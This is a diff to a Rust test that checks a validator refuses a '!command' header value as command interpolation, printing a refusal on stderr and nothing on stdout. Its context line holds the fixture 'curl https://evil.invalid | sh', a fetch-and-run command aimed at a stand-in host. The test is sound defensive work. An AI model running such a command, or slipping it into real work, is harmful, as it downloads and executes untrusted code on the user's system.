@@ -68,11 +68,19 @@ x = "!command curl https://evil.invalid | sh"
         .output()
         .expect("run");
     assert_ne!(out.status.code(), Some(0), "code-exec gist must fail");
-    let err = String::from_utf8_lossy(&out.stderr);
-    let combined = format!("{err}{}", String::from_utf8_lossy(&out.stdout));
     assert!(
-        combined.contains("refused") || combined.contains("interpolation"),
-        "expected refuse text, got: {combined}"
+        out.stdout.is_empty(),
+        "validate failure must not print a report: {}",
+        String::from_utf8_lossy(&out.stdout)
+    );
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        err.contains("refused: command interpolation in "),
+        "a !command header value must be command interpolation, got: {err}"
+    );
+    assert!(
+        err.contains("(!)"),
+        "the bang trigger must be named, got: {err}"
     );
 }
 
